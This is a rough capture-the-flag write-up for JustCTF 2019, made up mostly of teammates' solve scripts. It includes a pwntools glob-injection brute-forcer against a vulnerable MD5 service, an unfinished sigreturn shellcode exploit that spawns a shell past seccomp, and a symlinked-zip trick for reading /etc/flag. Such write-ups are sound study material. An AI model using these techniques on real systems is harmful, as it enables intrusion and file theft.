# JustCTF 2019 

![image](https://user-images.githubusercontent.com/25066959/71326384-346f7400-24c8-11ea-818f-e02f8a41a666.png)   

This is a shitty writup I did this days after and the JustCTF site was down so no points and I didnt write down the flags... So solutions only with no real explenation... Im just trying to get more of these out there and I really let the ball drop this time.    

Most of these scripts are from my teamates... they are smarter then me.

Title                         | Category     
----------------------------- | ------------
MD5 Service		      | Misc	     
Shellcode Executor Pro (not solved)					  | Pwn   
FirmwareUpdater				  | Web 
Matryoshka				  | Web
Discreet		      | Misc
Dominos		      	      | Misc/PPC


## MD5 Service
![image](https://user-images.githubusercontent.com/25066959/71326393-536e0600-24c8-11ea-93a2-7dffe9418b99.png)   
```python
#!/usr/env python3
# The flag is hidden somewhere on the server, it contains `flag` in its name
import sys
import signal
import subprocess
import os
MODULE = os.path.dirname(__file__)
def user_command():
    return input()
def send(msg):
    print(msg)
def read_file(filename):
    try:
        with open(filename, "r") as f:
            return f.read()
    except:
        return ''
def md5_file(filename):
    out = subprocess.check_output(['/task/md5service.sh'], input=filename.encode(), stderr=subprocess.DEVNULL)
    return out
def main():
    def handler(signum, frame):
        print('Time limit exceeded. Good bye!')
        sys.stdout.flush()
        sys.exit(1)
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(30)
    print("Welcome to md5service!")
    print("I have two commands:")
    print("MD5 <file>     -- will return a md5 for a file")
    print("READ <file>    -- will read a file")
    for i in range(500):
        cmd = input("Cmd: ")
        splitted = cmd.split(' ', 1)
        if len(splitted) != 2:
            print('\nBad command. Use MD5|READ <file>')
            continue
        cmd, arg = splitted
        arg = arg.strip()
        if cmd == 'MD5':
            print('Executing MD5 on %r' % arg)
            sys.stdout.flush()
            print('Result:')
            print(md5_file(arg))
        elif cmd == 'READ':
            print('Executing READ on %r' % arg)
            sys.stdout.flush()
            print('RESULT:')
            print(read_file(arg))
        else:
            print('Unrecoginzed command. Try again!')
            sys.stdout.flush()
    print('500 commands limits exceeded. Bye!')
    sys.stdout.flush()
if __name__ == '__main__':
    main()
```   
Executing READ on '/task/md5service.sh'   
RESULT:   
#!/bin/bash   
read x;   
y=`md5sum $x`;   
echo $y | cut -c1-32;    
doesnt work so use this then to find the path...    
```python 
#!/usr/bin/env python2
from pwn import *
import string
# flag_path = '0c8702194e16f006e61f45d5fa0cd511/flag_a6214417905b7d091f00ff59b51d5d78.txt'
flag_path = ''
p = remote("md5service.nc.jctf.pro", 1337)
while True:
    found = False
    # for c in string.ascii_lowercase + string.digits + 'lg_.':
    for c in "0123456789abcdef" + '_.':
        p.sendlineafter("Cmd:", 'MD5 /{}*'.format(flag_path + c))
        p.recvuntil('Result:\n')
        output = p.recvline().strip()
        print c, output
        if len(output) >= 32: # MD5 hash found:
            flag_path += c
            print flag_path
            found = True
            break
    if not found:
        break
p.interactive()
```
		
## Shellcode Executor PRO 
(Not solved)   
![image](https://user-images.githubusercontent.com/25066959/71326431-cbd4c700-24c8-11ea-99b7-bbf78277608e.png)    
```python
#!/usr/bin/env python2

from pwn import *

context(arch = 'amd64')

# p = process("./shellcodeexecutor")
p = remote("shellcode-executor.nc.jctf.pro", 1337)

# Delete shellcode
p.sendlineafter("> ", "2")

# Overwrite chunks
p.sendlineafter(">", "1")

frame = SigreturnFrame(kernel='amd64')
frame.rip = 0x1337
frame.rsp = 0x1338

shellcode = ""
shellcode += asm("push 0x3337")
for f in unpack_many(str(frame))[::-1]:

    if f == 0x1337:
        shellcode += asm("add rdx, 0x200; push rdx")
    elif f == 0x1338:
        shellcode += asm("push rsp")
    else:
        shellcode += asm("push {}".format(f))

shellcode += asm("""
    mov rax, 231
    syscall
""")

shellcode = shellcode.ljust(0x200, "\x90")
shellcode += asm(shellcraft.amd64.sh())
?
print hexdump(shellcode)

p.sendlineafter("Enter url: ", shellcode)

pause()

p.sendlineafter("> ", "3")

p.interactive()
```    
the challenge gives the impression that we have to do an alphanumeric shellcode, but we can bypass it and put the shellcode we want    
Seccomp rules looks like this:     
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0012
 0008: 0x15 0x03 0x00 0x0000000b  if (A == munmap) goto 0012
 0009: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0012
 0010: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0012
 0011: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```    
and we can read/write/mmap/munmap/rt_sigreturn/exit/exit_group     

## FirmwaeUpdater 
![image](https://user-images.githubusercontent.com/25066959/71326471-400f6a80-24c9-11ea-8937-bce2f5ab2560.png)   
Upload a zip with a symlink / etc / flag -> README.md    
like `zip -j -r --symlinks evil_firmware.zip ./evil_firmware/*`    
```
$ ls -l evil_firmware
.rw-r--r-- Corb3nik staff 22.5 KB Sun Dec  8 13:58:12 2019 ?  firmware.bin
lrwxr-xr-x Corb3nik staff    9 B  Fri Dec 20 19:27:52 2019 ?  README.md ? /etc/flag
```

## Matryoshka 
![image](https://user-images.githubusercontent.com/25066959/71326496-d2177300-24c9-11ea-93ce-ff8d5e32af93.png)    
![image](https://user-images.githubusercontent.com/25066959/71326509-f1ae9b80-24c9-11ea-85a3-74885b0b6974.png)   

## Discreet 
![image](https://user-images.githubusercontent.com/25066959/71326544-4a7e3400-24ca-11ea-8cf1-2a61d8f1972b.png)    
This is a guessing challenge   
```python
import numpy
r = numpy.fft.ifft(x)
s = ''
for i in range(10):
    s += chr(len(filter(lambda x: floor(x.real) == i, r))+1)
s
```    
```python
import numpy
r = numpy.fft.ifft(x)
show(points([(c.real,c.imag) for c in r], color='darkgreen', pointsize=5), aspect_ratio=1)
```

## Dominos 
![image](https://user-images.githubusercontent.com/25066959/71326594-f758b100-24ca-11ea-9dd6-11ffc45064ca.png)   
(index array) 75 76 19 82 make _so lve d_t he_so it’s just split into three character slices and in a random order?    
lets use a script...
wordlist.txt is a english dictionary and puzzles.txt is the challenge code
puzzles.txt:    
```
_so
d_t
he_sp
mak_w
...
```
solution:
```python3
#!/usr/bin/env python3

from itertools import product

def merge(parts):
    ret = ''
    for part in parts[:-1]:
        ret += part[:-2]

    return ret + parts[-1]

words = open("./words.txt").readlines()
words = list(map(str.strip, words))

puzzles = open("./puzzles.txt").readlines()
puzzles = list(map(str.strip, puzzles))
puzzles = sorted(puzzles)


used = []
flag_done = False
while True:

    single_match_found = False

    matches = {}
    for i, puzzle in enumerate(puzzles):
        last_letters = puzzle[-2:]

        if i in used:
            continue

        for j, puzzle_2 in enumerate(puzzles):
            first_letters = puzzle_2[:2]

            if j in used:
                continue

            if last_letters == first_letters:
                current_matches = matches.get(i, [])
                current_matches.append(j)
                matches[i] = current_matches

    for k in matches:

        possible_words = set([puzzles[i] for i in matches[k]])

        if len(possible_words) == 1:

            single_match_found = True

            matched_index = matches[k][0]
            used.append(k)
            used.append(matched_index)

            new_word = merge([puzzles[k], puzzles[matched_index]])
            puzzles.append(new_word)
            break

        if len(matches[k]) == 0:
            flag = puzzles[k]
            flag_done = True
            break


    if not single_match_found and not flag_done:

        print("Manual round!")

        for k in matches:

            possible_words = set([puzzles[i] for i in matches[k]])

            if len(possible_words) >= 2:
                print("Choose one for {} ('\\n' to go to next | 's' to skip): ".format(puzzles[k]))

                for match in matches[k]:
                    print('[{}] - {}'.format(match, puzzles[match]))

                choice = raw_input("> ").strip()
                if choice != '' and choice != 's':
                    single_match_found = True
                    matched_index = int(choice)
                    used.append(k)
                    used.append(matched_index)
                    new_word = merge([puzzles[k], puzzles[matched_index]])
                    puzzles.append(new_word)
                    break

                if choice == 's':
                    break

        if len(matches[k]) == 0:
            flag = puzzles[k]
            flag_done = True
            break

    print(puzzles)
```

